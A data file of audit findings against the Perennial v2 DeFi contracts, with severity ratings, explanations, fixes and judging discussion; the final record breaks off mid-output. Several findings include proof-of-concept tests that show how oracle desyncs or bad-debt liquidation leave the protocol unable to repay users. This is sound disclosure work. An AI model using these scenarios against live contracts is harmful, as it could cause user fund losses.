Invalid oracle versions can cause desync of global and local positions making protocol lose funds and being unable to pay back all usersчhighч"```\nit('panprog global-local desync', async () => {\n    const positionMaker = parse6decimal('2.000')\n    const positionLong = parse6decimal('1.000')\n    const collateral = parse6decimal('100')\n\n    const oracleVersion = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, oracleVersion.timestamp + 100])\n    oracle.request.returns()\n\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, collateral, false)\n\n    const oracleVersion2 = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP + 100,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion2.timestamp).returns(oracleVersion2)\n    oracle.status.returns([oracleVersion2, oracleVersion2.timestamp + 100])\n    oracle.request.returns()\n\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, positionLong, 0, collateral, false)\n\n    var info = await market.locals(userB.address);\n    console.log(""collateral deposit maker: "" + info.collateral);\n    var info = await market.locals(user.address);\n    console.log(""collateral deposit long: "" + info.collateral);\n\n    // invalid oracle version\n    const oracleVersion3 = {\n        price: 0,\n        timestamp: TIMESTAMP + 200,\n        valid: false,\n    }\n    oracle.at.whenCalledWith(oracleVersion3.timestamp).returns(oracleVersion3)\n\n    // next oracle version is valid\n    const oracleVersion4 = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP + 300,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion4.timestamp).returns(oracleVersion4)\n\n    // still returns oracleVersion2, because nothing commited for version 3, and version 4 time has passed but not yet commited\n    oracle.status.returns([oracleVersion2, oracleVersion4.timestamp + 100])\n    oracle.request.returns()\n\n    // reset to 0\n    await market.connect(user).update(user.address, 0, 0, 0, 0, false)\n\n    // oracleVersion4 commited\n    oracle.status.returns([oracleVersion4, oracleVersion4.timestamp + 100])\n    oracle.request.returns()\n\n    // settle\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, 0, false)\n\n    const oracleVersion5 = {\n        price: parse6decimal('90'),\n        timestamp: TIMESTAMP + 400,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion5.timestamp).returns(oracleVersion5)\n    oracle.status.returns([oracleVersion5, oracleVersion5.timestamp + 100])\n    oracle.request.returns()\n\n    // settle\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, 0, false)\n    await market.connect(user).update(user.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(userB.address);\n    console.log(""collateral maker: "" + info.collateral);\n    var info = await market.locals(user.address);\n    console.log(""collateral long: "" + info.collateral);\n})\n```\n"ч"In more details, if there are 2 pending positions with timestamps different by 2 oracle versions and the first of them has invalid oracle version at its timestamp, then there are 2 different position flows possible depending on the time when the position is settled (update transaction called):\nFor earlier update the flow is: previous position (oracle v1) -> position 1 (oracle v2) -> position 2 (oracle v3)\nFor later update position 1 is skipped completely (the fees for the position are also not taken) and the flow is: previous position (oracle v1) -> invalidated position 1 (in the other words: previous position again) (oracle v2) -> position 2 (oracle v3)\nWhile the end result (position 2) is the same, it's possible that pending global position is updated earlier (goes the 1st path), while the local position is updated later (goes the 2nd path). For a short time (between oracle versions 2 and 3), the global position will accumulate everything (including profit and loss) using the pending position 1 long/short/maker values, but local position will accumulate everything using the previous position with different values.\nConsider the following scenario: Oracle uses granularity = 100. Initially user B opens position maker = 2 with collateral = 100. T=99: User A opens long = 1 with collateral = 100 (pending position long=1 timestamp=100) T=100: Oracle fails to commit this version, thus it becomes invalid T=201: At this point oracle version at timestamp 200 is not yet commited, but the new positions are added with the next timestamp = 300: User A closes his long position (update(0,0,0,0)) (pending position: long=1 timestamp=100; long=0 timestamp=300) At this point, current global long position is still 0 (pending the same as user A local pending positions)\nT=215: Oracle commits version with timestamp = 200, price = $100 T=220: User B settles (update(2,0,0,0) - keeping the same position). At this point the latest oracle version is the one at timestamp = 200, so this update triggers update of global pending positions, and current latest global position is now long = 1.0 at timestamp = 200. T=315: Oracle commits version with timestamp = 300, price = $90 after settlement of both UserA and UserB, we have the following:\nGlobal position settlement. It accumulates position [maker = 2.0, long = 1.0] from timestamp = 200 (price=$100) to timestamp = 300 (price=$90). In particular: longPnl = 1*($90-$100) = -$10 makerPnl = -longPnl = +$10\nUser B local position settlement. It accumulates position [maker = 2.0] from timestamp = 200 to timestamp = 300, adding makerPnl ($10) to user B collateral. So user B collateral = $110\nUser A local position settlement. When accumulating, pending position 1 (long = 1, timestamp = 100) is invalidated to previous position (long = 0) and also fees are set to 0 by invalidation. So user A local accumulates position [long = 0] from timestamp = 0 to timestamp = 300 (next pending position), this doesn't change collateral at all (remains $100). Then the next pending position [long = 0] becomes the latest position (basically position of long=1 was completely ignored as if it has not existed).\nResult: User A deposited $100, User B deposited $100 (total $200 deposited) after the scenario above: User A has collateral $110, User B has collateral $100 (total $210 collateral withdrawable) However, protocol only has $200 deposited. This means that the last user will be unable to withdraw the last $10 since protocol doesn't have it, leading to a user loss of funds.\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```\nit('panprog global-local desync', async () => {\n    const positionMaker = parse6decimal('2.000')\n    const positionLong = parse6decimal('1.000')\n    const collateral = parse6decimal('100')\n\n    const oracleVersion = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, oracleVersion.timestamp + 100])\n    oracle.request.returns()\n\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, collateral, false)\n\n    const oracleVersion2 = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP + 100,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion2.timestamp).returns(oracleVersion2)\n    oracle.status.returns([oracleVersion2, oracleVersion2.timestamp + 100])\n    oracle.request.returns()\n\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, positionLong, 0, collateral, false)\n\n    var info = await market.locals(userB.address);\n    console.log(""collateral deposit maker: "" + info.collateral);\n    var info = await market.locals(user.address);\n    console.log(""collateral deposit long: "" + info.collateral);\n\n    // invalid oracle version\n    const oracleVersion3 = {\n        price: 0,\n        timestamp: TIMESTAMP + 200,\n        valid: false,\n    }\n    oracle.at.whenCalledWith(oracleVersion3.timestamp).returns(oracleVersion3)\n\n    // next oracle version is valid\n    const oracleVersion4 = {\n        price: parse6decimal('100'),\n        timestamp: TIMESTAMP + 300,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion4.timestamp).returns(oracleVersion4)\n\n    // still returns oracleVersion2, because nothing commited for version 3, and version 4 time has passed but not yet commited\n    oracle.status.returns([oracleVersion2, oracleVersion4.timestamp + 100])\n    oracle.request.returns()\n\n    // reset to 0\n    await market.connect(user).update(user.address, 0, 0, 0, 0, false)\n\n    // oracleVersion4 commited\n    oracle.status.returns([oracleVersion4, oracleVersion4.timestamp + 100])\n    oracle.request.returns()\n\n    // settle\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, 0, false)\n\n    const oracleVersion5 = {\n        price: parse6decimal('90'),\n        timestamp: TIMESTAMP + 400,\n        valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion5.timestamp).returns(oracleVersion5)\n    oracle.status.returns([oracleVersion5, oracleVersion5.timestamp + 100])\n    oracle.request.returns()\n\n    // settle\n    await market.connect(userB).update(userB.address, positionMaker, 0, 0, 0, false)\n    await market.connect(user).update(user.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(userB.address);\n    console.log(""collateral maker: "" + info.collateral);\n    var info = await market.locals(user.address);\n    console.log(""collateral long: "" + info.collateral);\n})\n```\n\nConsole output for the code:\n```\ncollateral deposit maker: 100000000\ncollateral deposit long: 100000000\ncollateral maker: 110000028\ncollateral long: 100000000\n```\n\nMaker has a bit more than $110 in the end, because he also earns funding and interest during the short time when ephemeral long position is active (but user A doesn't pay these fees).\nCode Snippet\nThis means that for early timestamps, invalid version positions will become valid in the `sync` part of the `_settle`. But for late timestamps, invalid version position will be skipped completely in the loop before `sync`. This is the core reason of desync between local and global positions.\nTool used\nManual Review"ч"
Protocol fee from Market.sol is lockedчhighч```\n  function fund(IMarket market) external {\n        if (!instances(IInstance(address(market)))) revert FactoryNotInstanceError();\n      market.claimFee();\n    }\n```\nчHere is `MarketFactory#fund` function:\n```\n  function fund(IMarket market) external {\n        if (!instances(IInstance(address(market)))) revert FactoryNotInstanceError();\n      market.claimFee();\n    }\n```\n\nThis is `Market#claimFee` function:\n```\n    function claimFee() external {\n        Global memory newGlobal = _global.read();\n\n        if (_claimFee(address(factory()), newGlobal.protocolFee)) newGlobal.protocolFee = UFixed6Lib.ZERO;\n        // rest of code\n    }\n```\n\nThis is the internal `_claimFee` function:\n```\n    function _claimFee(address receiver, UFixed6 fee) private returns (bool) {\n        if (msg.sender != receiver) return false;\n\n        token.push(receiver, UFixed18Lib.from(fee));\n        emit FeeClaimed(receiver, fee);\n        return true;\n    }\n```\n\nAs we can see, when `MarketFactory#fund` is called, Market#claimFee gets called which will send the protocolFee to msg.sender(MarketFacttory). When you check through the MarketFactory contract, there is no place where another address(such as protocol multisig, treasury or an EOA) is approved to spend MarketFactory's funds, and also, there is no function in the contract that can be used to transfer MarketFactory's funds. This causes locking of the protocol fees.ч"Consider adding a `withdraw` function that protocol can use to get the protocolFee out of the contract. You can have the `withdraw` function transfer the MarketFactory balance to the treasury or something.\nDiscussion\nsherlock-admin\n2 comment(s) were left on this issue during the judging contest.\n141345 commented:\nh\nn33k commented:\nmedium\narjun-io\nWe originally wanted to keep the funds in the Factory (for a future upgrade) but it might make sense to instead allow the Factory Owner (Timelock) to claim these funds instead\nEmedudu\nEscalate\nI believe this is of HIGH severity because funds are permanently locked\nsherlock-admin2\nEscalate\nI believe this is of HIGH severity because funds are permanently locked\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\narjun-io\nFixed https://github.com/equilibria-xyz/perennial-v2/pull/79\nre: Escalation - since this contract can be upgraded the funds are not permanently locked\nEmedudu\nFixed https://github.com/equilibria-xyz/perennial-v2/pull/79\nCan't access the repo to review the fix. It's probably a private repo.\nsince this contract can be upgraded the funds are not permanently locked\nWhile it's true that the contract can potentially be upgraded to address this issue, it's essential to acknowledge that the current code we audited does, in fact, contain a high severity vulnerability. Otherwise, implying that all upgradeable contracts are free of bugs simply because they can be upgraded to resolve them would be misleading.\narjun-io\nOtherwise, implying that all upgradeable contracts are free of bugs simply because they can be upgraded to resolve them would be misleading.\nThe distinction here is that ""funds stuck"" are fixable via upgrades, whereas attacks which immediately drain funds or those which cause accounting errors are not after they are executed.\nhrishibhat\nResult: High Has duplicates Although Sponsor raises a valid point, perhaps Sherlock needs to have a rule with respect to smart contract upgrade-related issues. Historically smart contract upgrades have not weighed on the issue severity decisions but will be considered in future rule updates, however, this issue will be considered as a valid high issue based on historical decisions on similar issues.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nEmedudu: accepted"чProtocol fees cannot be withdrawn\nCode Snippet\nTool used\nManual Review
PythOracle:if price.expo is less than 0, wrong prices will be recordedчhighч```\n    function _recordPrice(uint256 oracleVersion, PythStructs.Price memory price) private {\n        _prices[oracleVersion] = Fixed6Lib.from(price.price).mul(\n            Fixed6Lib.from(SafeCast.toInt256(10 ** SafeCast.toUint256(price.expo > 0 ? price.expo : -price.expo)))\n        );\n        _publishTimes[oracleVersion] = price.publishTime;\n    }\n```\nчHere is PythOracle#_recordPrice function:\n```\n    function _recordPrice(uint256 oracleVersion, PythStructs.Price memory price) private {\n        _prices[oracleVersion] = Fixed6Lib.from(price.price).mul(\n            Fixed6Lib.from(SafeCast.toInt256(10 ** SafeCast.toUint256(price.expo > 0 ? price.expo : -price.expo)))\n        );\n        _publishTimes[oracleVersion] = price.publishTime;\n    }\n```\n\nIf price is 5e-5 for example, it will be recorded as 5e5 If price is 5e-6, it will be recorded as 5e6.\nAs we can see, there is a massive deviation in recorded price from actual price whenever price's exponent is negativeч```\nstruct Price{\n    Fixed6 price,\n    int256 expo\n}\n```\n\nThis way, the price exponents will be preserved, and can be used to scale the prices correctly wherever it is used.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\n141345 commented:\nh\narjun-io\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/53чWrong prices will be recorded. For example, If priceA is 5e-5, and priceB is 5e-6. But due to the wrong conversion,\nThere is a massive change in price(5e5 against 5e-5)\nwe know that priceA is ten times larger than priceB, but priceA will be recorded as ten times smaller than priceB. Unfortunately, current payoff functions may not be able to take care of these discrepancies\nCode Snippet\nTool used\nManual Review
Vault.sol: `settle`ing the 0 address will disrupt accountingчhighч```\nfunction _loadContext(address account) private view returns (Context memory context) {\n    // rest of code\n    context.global = _accounts[address(0)].read();\n    context.local = _accounts[account].read();\n    context.latestCheckpoint = _checkpoints[context.global.latest].read();\n}\n```\nчWithin `Vault#_loadContext` function, the context.global is the account of the 0 address, while context.local is the account of the address to be updated or settled:\n```\nfunction _loadContext(address account) private view returns (Context memory context) {\n    // rest of code\n    context.global = _accounts[address(0)].read();\n    context.local = _accounts[account].read();\n    context.latestCheckpoint = _checkpoints[context.global.latest].read();\n}\n```\n\nIf a user settles the 0 address, the global account will be updated with wrong data.\nHere is the _settle logic:\n```\nfunction _settle(Context memory context) private {\n    // settle global positions\n    while (\n        context.global.current > context.global.latest &&\n        _mappings[context.global.latest + 1].read().ready(context.latestIds)\n    ) {\n        uint256 newLatestId = context.global.latest + 1;\n        context.latestCheckpoint = _checkpoints[newLatestId].read();\n        (Fixed6 collateralAtId, UFixed6 feeAtId, UFixed6 keeperAtId) = _collateralAtId(context, newLatestId);\n        context.latestCheckpoint.complete(collateralAtId, feeAtId, keeperAtId);\n        context.global.processGlobal(\n            newLatestId,\n            context.latestCheckpoint,\n            context.latestCheckpoint.deposit,\n            context.latestCheckpoint.redemption\n        );\n        _checkpoints[newLatestId].store(context.latestCheckpoint);\n    }\n\n    // settle local position\n    if (\n        context.local.current > context.local.latest &&\n        _mappings[context.local.current].read().ready(context.latestIds)\n    ) {\n        uint256 newLatestId = context.local.current;\n        Checkpoint memory checkpoint = _checkpoints[newLatestId].read();\n        context.local.processLocal(\n            newLatestId,\n            checkpoint,\n            context.local.deposit,\n            context.local.redemption\n        );\n    }\n}\n```\n\nIf settle is called on 0 address, _loadContext will give context.global and context.local same data. In the _settle logic, after the global account(0 address) is updated with the correct data in the `while` loop(specifically through the processGlobal function), the global account gets reupdated with wrong data within the `if` statement through the processLocal function.\nWrong assets and shares will be recorded. The global account's assets and shares should be calculated with toAssetsGlobal and toSharesGlobal respectively, but now, they are calculated with toAssetsLocal and toSharesLocal.\ntoAssetsGlobal subtracts the globalKeeperFees from the global deposited assets, while toAssetsLocal subtracts globalKeeperFees/Checkpoint.count fees from the local account's assets.\nSo in the case of settling the 0 address, where global account and local account are both 0 address, within the while loop of _settle function, depositedAssets-globalKeeperFees is recorded for address(0), but then, in the `if` statement, depositedAssets-(globalAssets/Checkpoint.count) is recorded for address(0)\nAnd within the `Vault#_saveContext` function, context.global is saved before context.local, so in this case, context.global(which is 0 address with correct data) is overridden with context.local(which is 0 address with wrong data).чI believe that the ability to settle the 0 address is intended, so an easy fix is to save local context before saving global context: Before:\n```\n    function _saveContext(Context memory context, address account) private {\n        _accounts[address(0)].store(context.global);\n        _accounts[account].store(context.local);\n        _checkpoints[context.currentId].store(context.currentCheckpoint);\n    }\n```\n\nAfter:\n```\n    function _saveContext(Context memory context, address account) private {\n        _accounts[account].store(context.local);\n        _accounts[address(0)].store(context.global);\n        _checkpoints[context.currentId].store(context.currentCheckpoint);\n    }\n```\n\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\n141345 commented:\nh\narjun-io\nGreat find - we'll fix this\narjun-io\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/86чThe global account will be updated with wrong data, that is, global assets and shares will be higher than it should be because lower keeper fees was deducted.\nCode Snippet\nTool used\nManual Review
During oracle provider switch, if it is impossible to commit the last request of previous provider, then the oracle will get stuck (no price updates) without any possibility to fix itчmediumч```\n        uint256 latestTimestamp = global.latest == 0 ? 0 : oracles[global.latest].provider.latest().timestamp;\n        if (uint256(oracles[global.latest].timestamp) > latestTimestamp) return false;\n```\nчThe way oracle provider switch works is the following:\n`Oracle.update()` is called to set a new provider. This is only allowed if there is no other provider switch pending.\nThere is a brief transition period, when both the previous provider and a new provider are active. This is to ensure that all the requests made to the previous oracle are commited before switching to a new provider. This is handled by the `Oracle._handleLatest()` function, in particular the switch to a new provider occurs only when `Oracle.latestStale()` returns true. The lines of interest to us are:\n```\n        uint256 latestTimestamp = global.latest == 0 ? 0 : oracles[global.latest].provider.latest().timestamp;\n        if (uint256(oracles[global.latest].timestamp) > latestTimestamp) return false;\n```\n\n`latestTimestamp` - is the timestamp of last commited price for the previous provider `oracles[global.latest].timestamp` is the timestamp of the last requested price for the previous provider The switch doesn't occur, until last commited price is equal to or after the last request timestamp for the previous provider. 3. The functions to `commit` the price are in PythOracle: `commitRequested` and `commit`. 3.1. `commitRequested` requires publish timestamp of the pyth price to be within MIN_VALID_TIME_AFTER_VERSION..MAX_VALID_TIME_AFTER_VERSION from request time. It is possible that pyth price with signature in this time period is not available for different reasons (pyth price feed is down, keeper was down during this period and didn't collect price and signature):\n```\n        uint256 versionToCommit = versionList[versionIndex];\n        PythStructs.Price memory pythPrice = _validateAndGetPrice(versionToCommit, updateData);\n```\n\n`versionList` is an array of oracle request timestamps. And `_validateAndGetPrice()` filters the price within the interval specified (if it is not in the interval, it will revert):\n```\n        return pyth.parsePriceFeedUpdates{value: pyth.getUpdateFee(updateDataList)}(\n            updateDataList,\n            idList,\n            SafeCast.toUint64(oracleVersion + MIN_VALID_TIME_AFTER_VERSION),\n            SafeCast.toUint64(oracleVersion + MAX_VALID_TIME_AFTER_VERSION)\n        )[0].price;\n```\n\n3.2. `commit` can not be done with timestamp older than the first oracle request timestamp: if any oracle request is still active, it will simply redirect to commitRequested:\n```\n        if (versionList.length > nextVersionIndexToCommit && oracleVersion >= versionList[nextVersionIndexToCommit]) {\n            commitRequested(nextVersionIndexToCommit, updateData);\n            return;\n        }\n```\n\nAll new oracle requests are directed to a new provider, this means that previous provider can not receive any new requests (which allows to finalize it):\n```\n    function request(address account) external onlyAuthorized {\n        (OracleVersion memory latestVersion, uint256 currentTimestamp) = oracles[global.current].provider.status();\n\n        oracles[global.current].provider.request(account);\n        oracles[global.current].timestamp = uint96(currentTimestamp);\n        _updateLatest(latestVersion);\n    }\n```\n\nSo the following scenario is possible: timestamp=69: oracle price is commited for timestamp=50 timestamp=70: user requests to open position (Oracle.request() is made) timestamp=80: owner calls `Oracle.update()` timestamp=81: pyth price signing service goes offline (or keeper goes offline) ... timestamp=120: signing service goes online again. timestamp=121: another user requests to open position (Oracle.request() is made, directed to new provider) timestamp=200: new provider's price is commited (commitRequested is called with timestamp=121)\nAt this time, `Oracle.latest()` will return price at timestamp=50. It will ignore new provider's latest commit, because previous provider last request (timestamp=70) is still not commited. Any new price requests and commits to a new provider will be ignored, but the previous provider can not be commited due to absence of prices in the valid time range. It is also not possible to change oracle for the market, because there is no such function. It is also impossible to cancel provider update and impossible to change the provider back to previous one, as all of these will revert.\nIt is still possible for the owner to manually whitelist some address to call `request()` for the previous provider. However, this situation provides even worse result. While the latest version for the previous provider will now be later than the last request, so it will let the oracle switch to new provider, however `oracle.status()` will briefly return invalid oracle version, because it will return oracle version at the timestamp = last request before the provider switch, which will be invalid (the new request will be after that timestamp):\nThis can be abused by some user who can backrun the previous provider oracle commit (or commit himself) and use the invalid oracle returned by `status()` (oracle version with price = 0). Market doesn't expect the oracle status to return invalid price (it is expected to be always valid), so it will use this invalid price as if it's a normal price = 0, which will totally break the market:\nSo if the oracle provider switch becomes stuck, there is no way out and the market will become stale, not allowing any user to withdraw the funds.чThere are multiple possible ways to fix this. For example, allow to finalize previous provider if the latest `commit` from the new provider is newer than the latest `commit` from the previous provider by `GRACE_PERIOD` seconds. Or allow PythOracle to `commit` directly (instead of via commitRequested) if the `commit` oracleVersion is newer than the last request by `GRACE_PERIOD` seconds.\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\n141345 commented:\nm\narjun-io\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/58ч
Bad debt (shortfall) liquidation leaves liquidated user in a negative collateral balance which can cause bank run and loss of funds for the last users to withdrawчmediumч"```\nit('panprog bad debt liquidation bankrun', async () => {\n\n    function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n        const oracleVersion = {\n        price: parse6decimal(price),\n        timestamp: timestamp,\n        valid: true,\n        }\n        oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n        oracle.status.returns([oracleVersion, nextTimestamp])\n        oracle.request.returns()\n    }\n\n    var riskParameter = {\n        maintenance: parse6decimal('0.01'),\n        takerFee: parse6decimal('0.00'),\n        takerSkewFee: 0,\n        takerImpactFee: 0,\n        makerFee: parse6decimal('0.00'),\n        makerImpactFee: 0,\n        makerLimit: parse6decimal('1000'),\n        efficiencyLimit: parse6decimal('0.2'),\n        liquidationFee: parse6decimal('0.50'),\n        minLiquidationFee: parse6decimal('10'),\n        maxLiquidationFee: parse6decimal('1000'),\n        utilizationCurve: {\n        minRate: parse6decimal('0.0'),\n        maxRate: parse6decimal('1.00'),\n        targetRate: parse6decimal('0.10'),\n        targetUtilization: parse6decimal('0.50'),\n        },\n        pController: {\n        k: parse6decimal('40000'),\n        max: parse6decimal('1.20'),\n        },\n        minMaintenance: parse6decimal('10'),\n        virtualTaker: parse6decimal('0'),\n        staleAfter: 14400,\n        makerReceiveOnly: false,\n    }\n    var marketParameter = {\n        fundingFee: parse6decimal('0.0'),\n        interestFee: parse6decimal('0.0'),\n        oracleFee: parse6decimal('0.0'),\n        riskFee: parse6decimal('0.0'),\n        positionFee: parse6decimal('0.0'),\n        maxPendingGlobal: 5,\n        maxPendingLocal: 3,\n        settlementFee: parse6decimal('0'),\n        makerRewardRate: parse6decimal('0'),\n        longRewardRate: parse6decimal('0'),\n        shortRewardRate: parse6decimal('0'),\n        makerCloseAlways: false,\n        takerCloseAlways: false,\n        closed: false,\n    }\n        \n    await market.connect(owner).updateRiskParameter(riskParameter);\n    await market.connect(owner).updateParameter(marketParameter);\n\n    setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n    var collateral = parse6decimal('500')\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('50.000'), 0, 0, collateral, false)\n    dsu.transferFrom.whenCalledWith(userC.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userC).update(userC.address, parse6decimal('50.000'), 0, 0, collateral, false)\n\n    var collateral = parse6decimal('10')\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, parse6decimal('10.000'), 0, collateral, false)\n\n    var info = await market.locals(user.address);\n    var infoB = await market.locals(userB.address);\n    var infoC = await market.locals(userC.address);\n    console.log(""collateral before liquidation: "" + info.collateral + "" + "" + infoB.collateral + "" + "" + infoC.collateral + "" = "" + \n        info.collateral.add(infoB.collateral).add(infoC.collateral));\n\n    setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\n    setupOracle('90', TIMESTAMP + 200, TIMESTAMP + 300);\n    // liquidate\n    const EXPECTED_LIQUIDATION_FEE = parse6decimal('10')\n    dsu.transfer.whenCalledWith(liquidator.address, EXPECTED_LIQUIDATION_FEE.mul(1e12)).returns(true)\n    dsu.balanceOf.whenCalledWith(market.address).returns(COLLATERAL.mul(1e12))\n    await market.connect(liquidator).update(user.address, 0, 0, 0, EXPECTED_LIQUIDATION_FEE.mul(-1), true)\n\n    setupOracle('90', TIMESTAMP + 200, TIMESTAMP + 300);\n    await market.connect(userB).update(userB.address, 0, 0, 0, 0, false)\n    await market.connect(userC).update(userC.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(user.address);\n    var infoB = await market.locals(userB.address);\n    var infoC = await market.locals(userC.address);\n    console.log(""collateral after liquidation: "" + info.collateral + "" + "" + infoB.collateral + "" + "" + infoC.collateral + "" = "" + \n        info.collateral.add(infoB.collateral).add(infoC.collateral));\n})\n```\n"ч"Consider the following scenario:\nUser1 and User2 are the only makers in the market each with maker=50 position and each with collateral=500. (price=$100)\nA new user comes into the market and opens long=10 position with collateral=10.\nPrice drops to $90. Some liquidator liquidates the user, taking $10 liquidation fee. User is now left with the negative collateral = -$100\nSince User1 and User2 were the other party for the user, each of them has a profit of $50 (both users have collateral=550)\nAt this point protocol has total funds from deposit of User1($500) + User2($500) + new user($10) - liquidator($10) = $1000. However, User1 and User2 have total collateral of 1100.\nUser1 closes position and withdraws $550. This succeeds. Protocol now has only $450 funds remaining and 550 collateral owed to User2.\nUser2 closes position and tries to withdraw $550, but fails, because protocol doesn't have enough funds. User2 can only withdraw $450, effectively losing $100.\nSince all users know about this feature, after bad debt they will race to be the first to withdraw, triggering a bank run.\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```\nit('panprog bad debt liquidation bankrun', async () => {\n\n    function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n        const oracleVersion = {\n        price: parse6decimal(price),\n        timestamp: timestamp,\n        valid: true,\n        }\n        oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n        oracle.status.returns([oracleVersion, nextTimestamp])\n        oracle.request.returns()\n    }\n\n    var riskParameter = {\n        maintenance: parse6decimal('0.01'),\n        takerFee: parse6decimal('0.00'),\n        takerSkewFee: 0,\n        takerImpactFee: 0,\n        makerFee: parse6decimal('0.00'),\n        makerImpactFee: 0,\n        makerLimit: parse6decimal('1000'),\n        efficiencyLimit: parse6decimal('0.2'),\n        liquidationFee: parse6decimal('0.50'),\n        minLiquidationFee: parse6decimal('10'),\n        maxLiquidationFee: parse6decimal('1000'),\n        utilizationCurve: {\n        minRate: parse6decimal('0.0'),\n        maxRate: parse6decimal('1.00'),\n        targetRate: parse6decimal('0.10'),\n        targetUtilization: parse6decimal('0.50'),\n        },\n        pController: {\n        k: parse6decimal('40000'),\n        max: parse6decimal('1.20'),\n        },\n        minMaintenance: parse6decimal('10'),\n        virtualTaker: parse6decimal('0'),\n        staleAfter: 14400,\n        makerReceiveOnly: false,\n    }\n    var marketParameter = {\n        fundingFee: parse6decimal('0.0'),\n        interestFee: parse6decimal('0.0'),\n        oracleFee: parse6decimal('0.0'),\n        riskFee: parse6decimal('0.0'),\n        positionFee: parse6decimal('0.0'),\n        maxPendingGlobal: 5,\n        maxPendingLocal: 3,\n        settlementFee: parse6decimal('0'),\n        makerRewardRate: parse6decimal('0'),\n        longRewardRate: parse6decimal('0'),\n        shortRewardRate: parse6decimal('0'),\n        makerCloseAlways: false,\n        takerCloseAlways: false,\n        closed: false,\n    }\n        \n    await market.connect(owner).updateRiskParameter(riskParameter);\n    await market.connect(owner).updateParameter(marketParameter);\n\n    setupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\n    var collateral = parse6decimal('500')\n    dsu.transferFrom.whenCalledWith(userB.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userB).update(userB.address, parse6decimal('50.000'), 0, 0, collateral, false)\n    dsu.transferFrom.whenCalledWith(userC.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(userC).update(userC.address, parse6decimal('50.000'), 0, 0, collateral, false)\n\n    var collateral = parse6decimal('10')\n    dsu.transferFrom.whenCalledWith(user.address, market.address, collateral.mul(1e12)).returns(true)\n    await market.connect(user).update(user.address, 0, parse6decimal('10.000'), 0, collateral, false)\n\n    var info = await market.locals(user.address);\n    var infoB = await market.locals(userB.address);\n    var infoC = await market.locals(userC.address);\n    console.log(""collateral before liquidation: "" + info.collateral + "" + "" + infoB.collateral + "" + "" + infoC.collateral + "" = "" + \n        info.collateral.add(infoB.collateral).add(infoC.collateral));\n\n    setupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\n    setupOracle('90', TIMESTAMP + 200, TIMESTAMP + 300);\n    // liquidate\n    const EXPECTED_LIQUIDATION_FEE = parse6decimal('10')\n    dsu.transfer.whenCalledWith(liquidator.address, EXPECTED_LIQUIDATION_FEE.mul(1e12)).returns(true)\n    dsu.balanceOf.whenCalledWith(market.address).returns(COLLATERAL.mul(1e12))\n    await market.connect(liquidator).update(user.address, 0, 0, 0, EXPECTED_LIQUIDATION_FEE.mul(-1), true)\n\n    setupOracle('90', TIMESTAMP + 200, TIMESTAMP + 300);\n    await market.connect(userB).update(userB.address, 0, 0, 0, 0, false)\n    await market.connect(userC).update(userC.address, 0, 0, 0, 0, false)\n\n    var info = await market.locals(user.address);\n    var infoB = await market.locals(userB.address);\n    var infoC = await market.locals(userC.address);\n    console.log(""collateral after liquidation: "" + info.collateral + "" + "" + infoB.collateral + "" + "" + infoC.collateral + "" = "" + \n        info.collateral.add(infoB.collateral).add(infoC.collateral));\n})\n```\n\nConsole output for the code:\n```\ncollateral before liquidation: 10000000 + 500000000 + 500000000 = 